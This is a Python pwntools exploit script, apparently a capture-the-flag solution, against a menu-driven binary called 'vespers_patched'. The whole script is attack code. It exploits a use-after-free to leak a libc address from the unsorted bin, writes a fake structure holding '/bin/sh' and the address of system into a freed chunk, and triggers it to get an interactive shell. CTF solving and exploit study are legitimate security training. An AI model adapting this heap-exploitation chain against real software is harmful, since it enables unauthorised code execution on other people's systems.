from pwn import *

context.binary = exe = ELF("./vespers_patched", checksec=False)
libc = ELF("./libc.so_3.6", checksec=False)

p = process("./vespers_patched")

def menu(c):
    p.sendlineafter(b"> ", str(c).encode())

def recruit(name, style, length, transcript):
    menu(1)
    p.sendlineafter(b"Name this chorister: ", name)
    p.sendlineafter(b"style (0=Gregorian, 1=Echo, 2=Harmony): ", str(style).encode())
    p.sendlineafter(b"Transcript length (1-4096): ", str(length).encode())
    p.sendafter(b"raw bytes): ", transcript)

def retire(idx):
    menu(2)
    p.sendlineafter(b"Retire which seat? ", str(idx).encode())

def restore(idx):
    menu(3)
    p.sendlineafter(b"Restore which seat? ", str(idx).encode())

def recite(idx):
    menu(5)
    p.sendlineafter(b"Recite which seat? ", str(idx).encode())
    p.recvuntil(b"Transcript (")
    n = int(p.recvuntil(b" bytes):", drop=True))
    p.recvline()
    return p.recvn(n)

def perform():
    menu(8)

recruit(b"leak0", 0, 0x30, b"x"*0x30)       
recruit(b"leak1", 0, 0x430, b"y"*0x430)     
recruit(b"leak2", 0, 0x20, b"z"*0x20)      
retire(1)     
restore(1)    
leak = recite(1)
fd = u64(leak[0:8])
UNSORTED_BIN_OFFSET = 0x21ace0   
libc.address = fd - UNSORTED_BIN_OFFSET
system_addr = libc.symbols['system']
recruit(b"A", 0, 0x20, b"a"*0x20)  
recruit(b"C", 0, 0x20, b"c"*0x20)  
retire(3)   
retire(4)  
fake = flat({
    0x00: b"/bin/sh\x00",
    0x38: p64(system_addr),   
    0x40: p64(0),             
    0x48: p64(0),             
    0x50: p64(1),            
}, length=0x58)

recruit(b"B", 0, 0x58, fake) 
perform()

p.interactive()
